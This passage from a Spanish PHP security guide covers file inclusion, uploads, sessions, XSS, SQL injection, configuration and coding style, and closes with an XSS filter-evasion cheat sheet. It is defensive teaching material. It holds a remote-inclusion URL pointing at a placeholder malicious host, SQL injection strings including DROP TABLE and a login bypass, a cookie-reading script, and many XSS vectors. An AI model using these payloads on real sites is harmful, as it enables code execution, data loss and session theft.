+están disponibles independientemente del ámbito.
+Inclusión y ficheros remotos
+Las funciones de PHP include() y require() proporcionan un mecanismo sencillo para incluir
+y evaluar ficheros. Cuando un fichero es incluido, el código que contiene hereda el ámbito dónde
+haya sido ejecutada la sentencia de inclusión. Todas las variables disponibles en ese mismo nivel
+estarán también disponibles para el fichero incluido. Y de la misma manera, las variables
+definidas en el fichero que se incluye quedarán disponibles para la página que lo llama con el
+ámbito actual. El fichero incluido no tiene por que residir de manera local. Si la directiva
+allow_url_fopen está activada en el php.ini, se pueden incluir ficheros utilizando una dirección
+URL.
+PHP lo obtendrá mediante HTTP en vez de mediante una ruta local. Aunque pueda parecer
+una funcionalidad muy útil, también entraña un gran riesgo de seguridad.
+Nota: La funcionalidad allow_url_fopen se encuentra activada por omisión.
+Un error común es no considerar que todos los ficheros pueden ser llamados directamente,
+esto es que un fichero escrito para ser incluido sea llamado directamente por un usuario
+malicioso. Un ejemplo:
+// file.php
+$sIncludePath = '/inc/';
+include($sIncludePath . 'functions.php');
+...
+// functions.php
+include($sIncludePath . 'datetime.php');
+include($sIncludePath . 'filesystem.php');
+En el ejemplo anterior, no se pretende llamar al fichero functions.php, por lo que se asume
+que la página llamante establece el valor a $sIncludePath. Creando un archivo llamado
+datetime.php o filesystem.php en otro servidor (y desactivando el procesamiento de PHP en
+dicho servidor para que no se interprete) podemos llamar a functions.php de la siguiente manera: 
+
 ****************************************************************************************************
 277
+
+functions.php?sIncludePath=http://www.hostmalicioso.com/
+PHP descargará el fichero datetime.php del otro servidor y lo ejecutará, lo que implica que
+un usuario malicioso podría ejecutar su propio código en el fichero functions.php. No
+recomiendo inclusiones dentro de inclusiones (como el ejemplo anterior). En mi opinión, es más
+difícil el entender y tener una idea general del código. En estos momentos, lo que queremos es
+hacer que el código anterior sea seguro, y para ello, tenemos que asegurar que file.php realmente
+llama a functions.php. El fragmento de código siguiente muestra una solución:
+// file.php
+define('SECURITY_CHECK', true);
+$sIncludePath = '/inc/';
+include($sIncludePath . 'functions.php');
+...
+// functions.php
+if ( !defined('SECURITY_CHECK') ) {
+// Muestra un mensaje de error y sale.
+...
+}
+include($sIncludePath . 'datetime.php');
+include($sIncludePath . 'filesystem.php');
+La función define() define una constante. Las constantes no son prefijadas por un signo de
+dólar ($), por lo que no podríamos asignarlas de la siguiente manera:
+functions.php?SECURITY_CHECK=1 Aunque no es algo común últimamente, todavía se
+pueden ver ficheros PHP con la extensión .inc. Estos ficheros están destinados únicamente a ser
+incluidos por otros ficheros. Lo que no se tiene en cuenta es que si dichos ficheros son llamados
+directamente, no son interpretados por PHP, por lo que se envían en texto claro. Debemos ser
+coherentes y añadirles una extensión que sepamos que será interpretada por PHP. Se recomienda
+la propia extensión .php. 
+
 ****************************************************************************************************
 278
+
+Subida de ficheros
+PHP es un lenguaje rico en funcionalidades, y una de ellas es la gestión automática en cuanto
+a subidas de ficheros. Cuando un fichero es subido a una página PHP, se guarda
+automáticamente en un directorio temporal. En ese momento quedan disponibles nuevas
+variables globales refiriéndose al fichero subido en la página. Veamos el siguiente código
+HTML que presenta a un usuario un formulario de subida:
+<form action= “page.php “ method= “POST “ enctype= “multipart/form-data “>
+<input type= “file “ name= “testfile “ />
+<input type= “submit “ value= “Subir fichero “ />
+</form>
+Después de enviar el formulario anterior, quedarán disponibles nuevas variables en el fichero
+page.php basadas en el nombre “testfile”.
+// Variables establecidas por PHP y lo que contendrán:
+// Fichero/Directorio temporal generado por PHP. Aquí es dónde quedará
+//guardado el fichero antes de ser movido o eliminado por PHP si decidimos no
+//hacer nada con él.
+$testfile
+// El nombre original/directorio del fichero en el sistema del cliente
+$testfile_name
+// El tamaño en bytes del fichero subido.
+$testfile_size
+// El tipo MIME del fichero si el navegador proporciona dicha información.
+//Por ejemplo: “image/jpeg”.
+$testfile_type
+Lo normal es comprobar si la variable $testfile tiene un valor asignado, y si lo tiene, trabajar
+con ella de manera adecuada, quizás copiando el fichero a un directorio público, accesible por
+cualquier navegador. Salta a la vista: es una manera muy insegura de trabajar con ficheros
+subidos. La variable $testfile no tiene por que ser una ruta o fichero dirigido al fichero subido.
+Puede venir de un GET, POST, COOKIE, etc. Un usuario malicioso podría hacernos trabajar con
+cualquier fichero del servidor, cosa que no es para nada adecuado. No debemos asumir nada
+sobre la opción register_globals, ya que puede estar tanto activada como desactivada, por lo
+tanto nuestro código debería funcionar con o sin ella, y lo más importante, será igual de segura
+independientemente de las opciones de configuración establecidas. Por lo tanto, lo primero que
+debemos hacer es utilizar el array $_FILES: 
+
 ****************************************************************************************************
 279
+
+// El nombre de fichero temporal generado por PHP
+$_FILES['testfile']['tmp_name']
+// El nombre o ruta original del fichero en el sistema cliente.
+$_FILES['testfile']['name']
+// La cabecera MIME del fichero si el navegador proporciona esta información.
+// Por ejemplo: “image/jpeg “.
+$_FILES['testfile']['type']
+// El tamaño en bytes del fichero subido.
+$_FILES['testfile']['size']
+Las funciones disponibles is_uploaded_file() y/o move_uploaded_file() deberían
+llamarse con $_FILES['testfile']['tmp_name'] para asegurar que realmente el fichero fue
+enviado mediante un POST HTTP. El siguiente ejemplo muestra una manera sencilla de trabajar
+con ficheros subidos:
+if ( is_uploaded_file($_FILES['testfile']['tmp_name']) ) {
+// Comprobar si el tamaño del fichero es el que esperamos (opcional)
+if ( $_FILES['sImageData']['size'] > 102400 ) {
+// El tamaño no puede ser superior a 100kB, mostrar mensaje de error y salir.
+ ...
+}
+// Validar el nombre del fichero y su extensión basados en el nombre original
+//de $_FILES['testfile']['name'],
+// No queremos que exista la posibilidad de subir ficheros con extensión .php
+por ejemplo.
+ ...
+// Si todo es correcto, mover el fichero con la función move_uploaded_file
+...
+}
+Nota: Debemos comprobar siempre si la variable en los arrays de las superglobals están
+inicializadas, mediante isset(), antes de acceder a ellas. En los ejemplos anteriores no se realiza
+para facilitar su comprensión. 
+
 ****************************************************************************************************
 280
+
+Sesiones
+Las sesiones en PHP son una manera de preservar variables específicas o el “estado” de un
+usuario, durante peticiones posteriores a la página. Esto se consigue asignando un identificador
+de sesión único al navegador mientras el navegador envía cada una de las nuevas peticiones. La
+sesión persiste mientras el navegador siga enviando el identificador con cada nueva petición y el
+tiempo entre las peticiones no sea excesivo. Generalmente, el identificador de sesión se
+implementa en forma de cookie, pero también se puede representar como un valor transmitido a
+través de la dirección. Las variables de sesión residen en ficheros en un directorio especificado
+en el php.ini, y los nombres de dichos ficheros están basados en los identificadores de las
+sesiones. Cada fichero contendrá las variables para esa sesión en texto claro. Primero
+analizaremos la manera antigua e insegura de trabajar con las sesiones; desafortunadamente esta
+forma de trabajar con las sesiones se sigue utilizando aún hoy en día en numerosas ocasiones.
+// first.php
+// Inicializar el gestor de la sesión
+session_start();
+// Autenticar al usuario
+if ( ... ) {
+$bIsAuthenticated = true;
+} else {
+$bIsAuthenticated = false;
+}
+// Registrar la variable $bIsAuthenticated como variable de sesión
+session_register('bIsAuthenticated');
+echo '<a href= “second.php “>A la segunda página</a>';
+// second.php
+// Inicializar el gestor de la sesión
+session_start();
+// $bIsAuthenticated queda establecido automáticamente por PHP
+if ( $bIsAuthenticated ) {
+ // Muestra información sensible
+ ...
+} 
+
 ****************************************************************************************************
 281
+
+¿Por qué lo anterior es inseguro? Es inseguro porque con un simple
+second.php?bIsAuthenticated=1 se podría saltar la autenticación del fichero first.php.
+session_start() es llamado implícitamente por session_register() o por PHP si la directiva
+session.auto_start está establecida en el php.ini (por defecto está desactivada). Sin embargo, para
+ser consistentes y no depender de la configuración siempre deberá ser llamada por nosotros
+mismos. Lo siguiente muestra la manera recomendada de trabajar con sesiones:
+// first.php
+// Inicializar el gestor de la sesión
+session_start();
+// Autenticar al usuario
+if ( ... ) {
+$_SESSION['bIsAuthenticated'] = true;
+} else {
+$_SESSION['bIsAuthenticated'] = false;
+}
+echo '<a href= “second.php”> A la segunda página</a>';
+// second.php
+// Inicializar el gestor de la sesión
+session_start();
+if ($_SESSION['bIsAuthenticated'] ) {
+// Muestra información sensible
+...
+}
+No es que el anterior código sea sólo más seguro, también es en mi opinión más limpio y
+fácil de entender. Nota: En sistemas multiservidor, se debe asegurar el directorio que contiene
+los ficheros de la sesión (normalmente se encuentran bajo el directorio /tmp), ya que si no, los
+usuarios podrían ser capaces de crear ficheros de sesión personalizados para otros sitios.
+Cross-site scripting (XSS)
+Imaginemos una aplicación de un libro de visitas en PHP. Al visitante se le muestra un
+formulario en el cual escribe un mensaje. Este formulario se envía a una página que almacena la
+información en una base de datos. Cuando alguien visita el libro de visitas, toda la información
+se obtiene de base de datos para ser enviada al navegador. Por cada mensaje, se ejecuta el
+siguiente código:: 
+
 ****************************************************************************************************
 282
+
+// $aRow contiene una fila de una petición SQL
+echo '<td>';
+echo $aRow['sMessage'];
+echo '</td>'; ...
+Lo que significa que directamente lo que se introdujo en el formulario, se enviará tal cual a
+cada navegador del usuario que visite el libro. ¿Por qué esto supone un problema? Imagine a
+alguien que introduce el carácter < o el carácter >, seguramente esto haría que se rompiese el
+formato y estilo de la página. Sin embargo, si esto fuese lo único que se podría provocar, no sería
+del todo grave. Esto en realidad ofrece la posibilidad de que se pueda inyectar JavaScript,
+HTML, VBScript, Flash, ActiveX etc. en la página. Cualquier usuario podría aprovecharse de
+esta opción para introducir por ejemplo un nuevo formulario, que pidiese cualquier tipo de
+información sensible. O incluso se podría hacer que se mostrasen anuncios no deseados. Las
+cookies pueden ser leídas mediante JavaScript en la mayoría de los navegadores, y con ellos la
+mayoría de los identificadores de sesión, lo que implicaría el secuestro de cuentas.
+Lo que se debe hacer es convertir todos los caracteres que tienen un significado especial para
+HTML, en entidades HTML. Por suerte, PHP proporciona una función que justo realiza esta
+tarea, esta función se llama htmlspecialchars() y convierte los caracteres “, &, < y > en &amp; “
+&lt; y &gt;. (PHP tiene otra función llamada htmlentities() que convierte todos los caracteres que
+tienen entidades HTML equivalentes, pero la función htmlspecialchars se adapta a nuestras
+necesidades perfectamente.)
+// La manera correcta de realizar lo anterior sería:
+echo '<td>';
+echo htmlspecialchars($aRow['sMessage']);
+echo '</td>'; ...
+Uno se podría preguntar por qué no hacerlo correctamente al almacenarlo en base de datos.
+Bueno, esto no daría más que problemas, ya que tendríamos que ir analizando de dónde se ha
+obtenido la información de cada una de las variables, y después tendríamos que tratar los valores
+de entrada de los GET y POST de manera diferente a los que obtenemos de base de datos. Es
+mucho mejor ser coherente y llamar a htmlspecialchars() con los datos antes de que los enviemos
+al navegador. Esto debe hacerse en todos los datos de entrada no filtrados antes de enviarlos al
+navegador.
+Porque htmlspecialchars no siempre es suficiente 
+
 ****************************************************************************************************
 283
+
+Veamos el siguiente fragmento de código:
+// Se supone que la página debería llamarse de la siguiente forma:
+//page.php?sImage=filename.jpg
+echo '<img src= “' . htmlspecialchars($_GET['sImage']) . '” />';
+El código anterior sin htmlspecialchars nos dejaría completamente vulnerables frente a
+ataques XSS, pero ¿por qué no es suficiente con htmlspecialchars?
+Ya que no nos encontramos dentro de una etiqueta HTML, no necesitamos ni el < ni el >
+para poder inyectar código malicioso. Veamos lo siguiente:
+// Cambiaremos la manera de llamar a la página:
+// page.php?sImage=javascript:alert(document.cookie);
+// Con el mismo código que el fragmento anterior…:
+echo '<img src= “' . htmlspecialchars($_GET['sImage']) . '” />'; <!—
+El siguiente código quedará finalmente tal que así:
+--> <img src= “javascript:alert(document.cookie);” />
+“javascript:alert(document.cookie);” se ejecutaría sin ningún tipo de modificación
+aún teniendo htmlspecialchars. Incluso si remplazamos algunos de los caracteres con referencias
+numéricas de caracteres HTML el código seguiría ejecutándose en algunos navegadores.
+<!—- Esto se ejecutaría en algunos navegadores: -->
+<img src= “javascript&#58;alert&#40;document.cookie&#41;;” />
+No existe una solución genérica más que la de aceptar únicamente valores de entrada que
+sepamos que son seguros, el intentar filtrar los valores no adecuados es difícil y estamos
+predestinados a olvidarnos de alguno. El fragmento final quedaría más o menos así:
+// Sólo aceptaremos valores que sabemos que son seguros (en este caso // un
+nombre de fichero válido)
+if ( preg_match('/^[0-9a-z_]+\.[a-z]+$/i', $_GET['sImage']) ) {
+ echo '<img src="' . $_GET['sImage'] . '" />;';
+}
+
+Inyección SQL
+El termino inyección SQL es utilizado para denominar a la inyección de comandos dentro de
+una consulta SQL ya existente. El lenguaje estructurado de consultas (Structured Query
+Language - SQL) es un lenguaje textual utilizado para interactuar con servidores de bases de
+datos tales como MySQL, MS SQL y Oracle.
+
+$iThreadId = $_POST['iThreadId']; 
+
 ****************************************************************************************************
 284
+
+// Contrucción de la consulta SQL
+$sSql = “SELECT sTitle FROM threads WHERE iThreadId = “ . $iThreadId;
+Para averiguar que resulta incorrecto en el código anterior, veamos el siguiente fragmento de
+código HTML:
+<form method=“post” action=“insecure.php”>
+<input type=“text” name=“iThreadId” value=“4; DROP TABLE users” /> <input
+type=“submit” value=“Don't click here” />
+</form>
+Si enviásemos el formulario anterior a nuestra página insegura, la cadena enviada al servidor
+de la base de datos sería la siguiente, que no es algo muy adecuado que digamos:
+SELECT sTitle FROM threads WHERE iThreadId = 4; DROP TABLE users
+Existen diversos métodos mediante los cuales podemos unir comandos SQL de esta manera,
+algunos dependiendo incluso del servidor de la base de datos. Para ir un poco más allá, veamos
+el siguiente código tan común en aplicaciones PHP:
+$sSql = “SELECT iUserId FROM users” .
+“ WHERE sUsername = '“ .
+$_POST['sUsername'] .
+“' AND sPassword = '“ .
+$_POST['sPassword'] . “'“;
+ Podemos saltarnos la sección de la contraseña introduciendo “theusername'--” como el
+nombre de usuario o “' OR '' = '“ como contraseña (sin las dobles comillas), resultando lo
+siguiente:
+// Nota: los dos guiones “—-“ es la manera de comentar líneas en MS // SQL por
+lo que todo lo que venga después no se interpretará
+SELECT iUserId FROM users WHERE sUsername = 'theusername'--' AND sPassword =
+''
+// O:
+SELECT iUserId FROM users WHERE sUsername = 'theusername' AND sPassword = ''
+OR '' = ''
+Aquí es dónde la validación entra en juego, en el primer ejemplo anterior debemos
+comprobar que realmente $iThreadId es un número antes de que la unamos a la consulta SQL.
+if ( !is_numeric($iThreadId) ) {
+// Si no es un número, mensaje de error y salir.
+...
+} 
+
 ****************************************************************************************************
 285
+
+El segundo ejemplo tiene un poco de truco ya que PHP incluye funcionalidades para
+prevenirlo, si están establecidas. La directiva se llama magic_quotes_gpc, que al igual que
+register_globals nunca deberían haber sido integradas en PHP, en mi opinión, y ahora explicaré
+por qué. Para tener caracteres como el de una comilla simple ' en una cadena de texto, tenemos
+que escaparlos, y esto se hace de diferente manera dependiendo del servidor de base de datos:
+// MySQL:
+SELECT iUserId FROM users WHERE sUsername = 'theusername\'--' AND sPassword =
+''
+// MS SQL Server: SELECT iUserId FROM users WHERE sUsername = 'theusername''--
+' AND sPassword = ''
+ Lo que hace magic_quotes_gpc, en el caso de estar activada, es escapar todos los valores de
+entrada desde GET, POST y COOKIE (gpc). Esto se realiza en el primero de los ejemplos,
+añadiendo una barra invertida. Por lo que si se introduce “theusername'--” en un formulario y se
+envía, $_POST['sUsername'] contendrá en realidad “theusername\'--”, que es perfectamente
+seguro para una consulta SQL, mientras que el servidor de base de datos los soporte (MS SQL
+Server no lo hace). Este es el primer problema. El segundo es que se necesitan filtrar las barras
+en caso de no utilizarlas en una consulta SQL. Por norma general, tenemos que hacer que nuestro
+código funcione sin tener en cuenta el estado de magic_quotes_gpc. El siguiente código presenta
+una solución al segundo ejemplo:
+// Filtrar las barras invertidas de GET, POST y COOKIE si magic_quotes_gpc
+//está activado
+if (get_magic_quotes_gpc()) {
+ // GET
+ if (is_array($_GET)) {
+ // Recorrer el array GET
+ foreach ($_GET as $key => $value) {
+ $_GET[$key] = stripslashes($value);
+ }
+ }
+ // POST
+ if (is_array($_POST)) {
+ // Recorrer el array POST
+ foreach ($_POST as $key => $value) {
+ $_POST[$key] = stripslashes($value);
+ } 
+
 ****************************************************************************************************
 286
+
+}
+ // COOKIE
+ if (is_array($_COOKIE)) {
+ // Recorrer el array COOKIE
+ foreach ($_COOKIE as $key => $value) {
+ $_COOKIE[$key] = stripslashes($value);
+ }
+ }
+}
+function sqlEncode($sText)
+{
+ $retval = '';
+ if ($bIsMySql) {
+ $retval = addslashes($sText);
+ } else {
+ // Es MS SQL Server
+ $retval = str_replace("'", "''", $sText);
+ }
+ return $retval;
+}
+$sUsername = $_POST['sUsername'];
+$sPassword = $_POST['sPassword'];
+$sSql = "SELECT iUserId FROM users ".
+ " WHERE sUsername = '" . sqlEncode($sUsername) . "'" .
+ " AND sPassword = '". sqlEncode($sPassword)."'";
+ Preferiblemente ponemos el bloque if y la función sqlEncode en un “include”. Como se
+puede imaginar, un usuario malicioso puede realizar técnicas más avanzadas frente a lo mostrado
+en los ejemplos anteriores, al dejar nuestros scripts vulnerables a inyección. He visto ejemplos de
+extracciones completas de bases de datos mediante vulnerabilidades como las descritas en este
+apartado. 
+
 ****************************************************************************************************
 287
+
+Inyección de código
+• include() y require() – Incluye y evalúa un fichero como código PHP.
+• eval() – Evalúa una cadena de texto como código PHP.
+• preg_replace() – El modificador /e hace que esta función trate el parámetro de remplazo
+como código PHP.
+Inyección de comandos
+exec(), passthru(), system(), popen() y la comilla invertida (`) – Ejecuta el valor de entrada
+como si fuese un mandato Shell.
+ Cuando se pasan los valores de entrada de un usuario a estas funciones, necesitamos evitar
+que los usuarios puedan manipularlos para ejecutar mandatos arbitrarios. PHP tiene dos
+funciones que deberían ser utilizadas para este propósito, que son escapeshellarg() y
+escapeshellcmd().
+Opciones de configuración
+register_globals
+Si está activada, PHP creará variables globales de todos los valores de entrada que vengan de
+los métodos GET, POST y COOKIE. Si se tiene la oportunidad de desactivar esta funcionalidad,
+definitivamente se debe hacer. Desafortunadamente existe gran cantidad de código que la utiliza
+por lo que siéntase afortunado si puede librarse de él.
+Valor recomendado: off
+safe_mode
+El modo seguro de PHP (safe_mode) incluye un conjunto de restricciones para los scripts
+programados en PHP que incrementan considerablemente el nivel de seguridad en entornos con
+un servidor compartido. Entre estas restricciones destacan: Un script sólo puede
+acceder/modificar ficheros y directorios que sean del mismo propietario que el de dicho script.
+Algunas funciones/operadores quedan completamente desactivadas o restringidas como por
+ejemplo la comilla invertida para la ejecución de mandatos.
+disable_functions
+Esta funcionalidad sirve para describir funciones que queramos deshabilitar.
+open_basedir 
+
 ****************************************************************************************************
 288
+
+Restricciones a PHP para que todas las operaciones con ficheros estén limitadas al directorio
+que se defina aquí y a sus subdirectorios.
+allow_url_fopen
+Con esta opción establecida, PHP podrá operar con ficheros remotos con funciones como
+include y fopen.
+Valor recomendado: off
+error_reporting
+Lo que se persigue es escribir el código de la manera más clara posible y por ello queeremos
+que PHP nos muestre todas las advertencias, etc.
+Valor recomendado: E_ALL
+log_errors
+Registra todos los errores y los guarda en el lugar especificado en el php.ini.
+Valor recomendado: on
+display_errors
+Con esta funcionalidad activada, todos los errores que sucedan durante la ejecución de los
+scripts, con respecto a error_reporting, serán mostrados por el navegador. Esto es conveniente
+en servidores de desarrollo pero no en los de producción, ya que podría mostrarse información
+sensible sobre nuestro código, base de datos o del propio servidor..
+Valor recomendado: off (servidores de producción), on (servidores de desarrollo)
+magic_quotes_gpc
+Filtra todos los valores de entrada que vengan de POST, GET y COOKIE. Esto es algo que
+debemos evaluar nosotros mismos.
+Esto también aplica a magic_quotes_runtime.
+Valor recomendado: off
+post_max_size, upload_max_filesize and memory_limit
+Estas funcionalidades deben quedar establecidas con un valor razonable para reducir el riesgo
+frente a ataques que impliquen la reducción o agotamiento de nuestros recursos.
+Prácticas recomendadas
+Comillas dobles frente a las simples
+// Comillas dobles:
+$sSql = “SELECT iUserId FROM users WHERE sName = 'John Doe'“; 
+
 ****************************************************************************************************
 289
+
+// Comillas simples:
+echo '<td width=“100”></td>';
+Como norma general se deben utilizar comillas dobles en peticiones SQL, para el resto
+utilizar comillas simples.
+No confiar en short_open_tag
+Si la directiva short_open_tag está activada, permite utilizar la forma simple de etiquetado
+PHP, esto es <? ?> en vez de <?php ?>. Al igual que ocurre con register_globals, no se debe
+asumir que se encuentra activada.
+Concatenación de cadenas de texto.
+$sOutput = 'Hello ' . $sName; // No: $sOutput = “Hello $sName”;
+Esto incrementa su facilidad de lectura y es menos propenso a errores.
+Comente su código.
+Siempre se tiene que intentar comentar su código fuente, a pesar de que le resulte muy
+simple, y recuerde hacerlo en castellano.
+Se debe evitar siempre el código complejo
+Si se encuentra con problemas a la hora de entender el código que ha programado entonces
+intente imaginarse a otra gente intentando entenderlo. Los comentarios ayudan pero no en todos
+los casos, así que ¡rescríbalo!
+Reglas de nombrado
+Los nombres de las variables deben contener tanto mayúsculas como minúsculas, empezando
+con la primera letra en minúscula seguido de una mayúscula
+$sName, $iSizeOfBorder // string, integer
+Esto hace que sea fácil detectar variables y averiguar que contienen. Se adjunta una lista de
+prefijos comunes:: 
+
 ****************************************************************************************************
 290
+
+• a para arrays
+• b para booleanos
+• d para enteros dobles
+• f para floats
+• i para enteros
+• l para long
+• s para strings
+• g_ para variables globales, seguidas de un prefijo normal
+Las variables booleanas deben tener el prefijo b seguidos de esta, tiene, puede o debe:
+$bEstaActivada, $bTienePropietario
+Esto también aplica a funciones que devuelven booleanos, pero sin el prefijo b, por ejemplo:
+$usuario->tieneEmail();
+Evitar nombres de variables booleanas negadas
+var $bEstaActivada;
+// No: $bNoEstaActivada
+var $bTieneId;
+// No: $bNoTieneId
+Lo que significa el siguiente código no resulta muy obvio:
+if ( !$bNoEstaActivada ) {
+...
+}
+Las variables de objeto deben estar en minúsculas o utilizar el prefijo ‘o’ o ‘obj’
+$session, $page // Más adecuado $oSession $objPage
+Lo más adecuado es todo minúsculas, pero lo importante es ser coherente.
+Las constantes deben ir todas en mayúsculas utilizando guiones bajos para separar
+palabras
+$SESSION_TIMEOUT, $BACKGROUND_COLOR, $PATH
+Sin embargo, por norma general de debe minimizar la utilización de dichas constantes y se
+debe recurrir a funciones.
+Los nombres de función deben comenzar por un verbo y empezar con letra minúscula
+alternando después con mayúscula 
+
 ****************************************************************************************************
 291
+
+validarUsuario (), obtenerArray ()
+Las abreviaturas no deben ir en mayúsculas cuando se utilizan en un nombre
+$sHtmlOutput
+// No:
+$sHTMLOutput
+getPhpInfo()
+// No:
+getPHPInfo()
+El utilizar mayúsculas seguidas infringiría las reglas anteriores de nombrado.
+Las palabras clave SQL deben ir todas en mayúsculas
+SELECT TOP 10 sUsername, sName FROM users
+Esto facilita la comprensión y la visión general de la consulta SQL.
+Las variables de las clases privadas deberían contener un guión bajo como sufijo
+class MyClass
+{
+ var $sName_;
+}
+Esta es una forma de diferenciar las variables públicas de las privadas. Sin embargo esto no
+es tan importante como en otros lenguajes, ya que en PHP podemos utilizar el puntero $this->
+para acceder a variables privadas.
+Todos los nombres deben ir escritos en castellano, aunque se recomienda el inglés
+$iFilaNum // Not: $iRadId (En sueco)
+Se recomienda utilizar el lenguaje castellano para el nombrado, aunque en realidad el inglés
+es el lenguaje internacional preferido para el desarrollo. En el caso de los comentarios, se
+recomienda el castellano.
+Las variables con un amplio ámbito deben tener nombres largos, para las de poca
+extensión, nombres cortos
+Se recomienda que las variables temporales se queden con los nombres cortos. Alguien que
+lea estas variables debería asumir que su valor no es utilizado más allá de unas pocas líneas de
+código. Las variables temporales más comunes son $i, $j, $k, $m y $n.
+El nombre del objeto es implícito, y debe ser evitado en el nombre del método
+$session->getId() // No: $session->getSessionId() 
+
 ****************************************************************************************************
 292
+
+Esto último debe parecer algo natural cuando se escriba la declaración de la clase, pero es
+implícito de su uso, como se muestra en el ejemplo anterior.
+Los términos get/set deben ser utilizados dónde el atributo sea accedido directamente
+$user->getName();
+$user->setName($sName);
+Esto también es una práctica común en lenguajes como C++ y Java
+Se deben evitar las abreviaturas
+$session->initialize();
+// No:
+$session->init();
+$thread->computePosts();
+// No:
+$thread->compPosts();
+Existe una excepción a esta regla, y es la de que existen nombres que son más conocidos en
+su manera abreviada, como por ejemplo en los casos de HTML, CPU etc.
+Sintaxis
+Declaración de clases y funciones
+function doSomething()
+{
+ // ...
+}
+// No:
+function doSomething() {
+ // ...
+}
+Lo mismo se aplica para la declaración de clases.
+Declaraciones y corchetes
+if ( $bIsActive )
+{
+... 
+
+
 ****************************************************************************************************
 293
+
+}
+// No:
+if ( $bIsActive ) {
+...
+}
+El primer corchete siempre debe estar en la línea siguiente de la declaración, y no en la
+misma línea. El código es mucho más fácil de seguir de esta manera. Esto también se aplica a las
+declaraciones de for, switch, while, etc.
+Declaraciones y espacios
+if ( $sName == 'John' )
+{
+// ...
+}
+// No:
+if ($sName=='John') {
+ // ...
+}
+Resumen
+¡Validar, validar y validar! No se debe confiar en ningún valor de entrada desde ningún tipo
+de fuente al menos que se esté seguro al 100% de que no ha sido posible su manipulación. Esto
+se aplica tanto en variables de ámbito global como en datos introducidos por GET, POST y
+COOKIE. Ni siquiera se puede confiar en la información de una base de datos, si en algún
+momento dicha información se introdujo a partir de datos proporcionados por un usuario. Nunca
+enviar información de salida sin filtrar al navegador o seguramente seremos vulnerables a
+ataques XSS de una manera u otra. 
+
 ****************************************************************************************************
 294
+
+Cheat Sheets
+Cross Site Scripting
+Esta lista ha sido reproducida aquí gracias a la amable autorización de Robert Hansen, cuya
+última actualización es del 28 de Abril de 2005. La lista más actualizada puede encontrarse en la
+dirección http://ha.ckers.org/xss.html
+Localizador de XSS
+Inyectar esta cadena, consultar el código fuente y buscar la palabra “XSS”, si se encuentra
+“<XSS” en vez de "&lt;XSS" puede ser vulnerable
+'';!--"<XSS>=&{()}
+XSS Normal
+<IMG SRC="javascript:alert('XSS');">
+Sin comillas o punto y coma
+<IMG SRC=javascript:alert('XSS')>
+Mayúsculas y minúsculas
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+Entidades HTML
+<IMG SRC=JaVaScRiPt:alert(&quot;XSS&quot;)>
+Codificación en Unicode UTF-8
+Principalmente en IE y Opera
+<IMG
+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&
+#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41> 
+
 ****************************************************************************************************
 295
+
+Codificación en Long UTF-8 sin puntos y coma
+Esto normalmente suele ser efectivo para códigos que buscan XSS del estilo &#XX, ya que la
+mayoría de la gente no tiene constancia de la posibilidad de relleno – hasta un total de 7
+caracteres numéricos. Esto tambien resulta satisfactorio frente a gente que decodifica cadenas de
+texto de la siguiente manera : $tmp_string =~ s/.*\&#(\d+);.*/$1/; que piensa de manera
+incorrecta que se necesita un punto y coma para finalizar una cadena de texto codificada en
+HTML, que se ha visto alguna vez.
+<IMG
+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#
+0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#000004
+0&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+Codificación en hexadecimal sin puntos y coma
+Este tambien resulta un ataque viable contra la siguiente expresión regular para sustitución,
+en Perl
+$tmp_string =~ s/.*\&#(\d+);.*/$1/;
+
+que asume que hay un dígito seguido de un símbolo # - que no es correcto en HTML
+hexadecimal.
+<IMG
+SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x7
+2&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+Inclusión de un espacio en blanco para romper el XSS
+Funciona tanto en IE como en Opera. Algunos sitios Web aseguran que cualquiera de los
+caracteres 09-13 (decimal) funcionará en este ataque. Esto es incorrecto. Sólo los 09 (tabulación
+horizontal), 10 (nueva línea) y 13 (retorno de carro) funcionan. Compruebe la tabla ASCII para
+más detalles. Los siguientes cuatro ejemplos demuestran lo comentado:
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG
+SRC 
+
 ****************************************************************************************************
 296
+
+=
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+'
+X
+S
+S
+'
+)
+"
+>
+Bytes nulos
+Vale, lo reconozco, he mentido, los caracteres nulos también funcionan como vectores XSS
+de ataque tanto en IE como en versiones antiguas de Opera, pero no como el caso anterior, en
+este caso se necesitan inyectarlos directamente utilizando por ejemplo Burp Proxy o en el caso
+de querer programar su propio método, también se puede utilizar vim (^V@ creará un byte nulo)
+o cualquier programa para generarlo dentro de un fichero de texto. Vale, he vuelto a mentir,
+versiones antiguas de Opera (7.11 en Windows) fueron vulnerables a un carácter adicional 173 
+
+
+
 ****************************************************************************************************
 297
+
+(el llamado carácter del guión “débil” o “suave”). Pero el carácter nulo %00 es mucho más útil y
+me ha ayudado a saltarme ciertos filtros reales con una variación del siguiente ejemplo:
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+Espacios
+Los espacios antes del JavaScript en imágenes, para el XS (esto es útil si el patrón no tiene en
+cuenta el número de espacios en la palabra “javascript:” – que es correcto y no se escribirá- y
+falsamente asume que no se puede tener un espacio entre las comillas y la palabra clave
+“javascript:”):
+<IMG SRC=" javascript:alert('XSS');">
+Sin comillas simples o dobles ni puntos y coma
+<SCRIPT>a=/XSS/
+alert(a.source)</SCRIPT>
+Imagen en el Body
+<BODY BACKGROUND="javascript:alert('XSS')">
+Etiqueta Body
+Me gusta este método por no requerirse ninguna variante de “javascript:” o “<SCRIPT…”
+para llevar a cabo correctamente el ataque XSS:
+<BODY ONLOAD=alert('XSS')>
+Manejadores de eventos
+Los manejadores de eventos pueden ser utilizados en ataques XSS parecidos a los ataques del
+“BODY ONLOAD” anterior. Esta es la lista más completa de la red, en el momento en el que se
+está escribiendo este documento. 
+
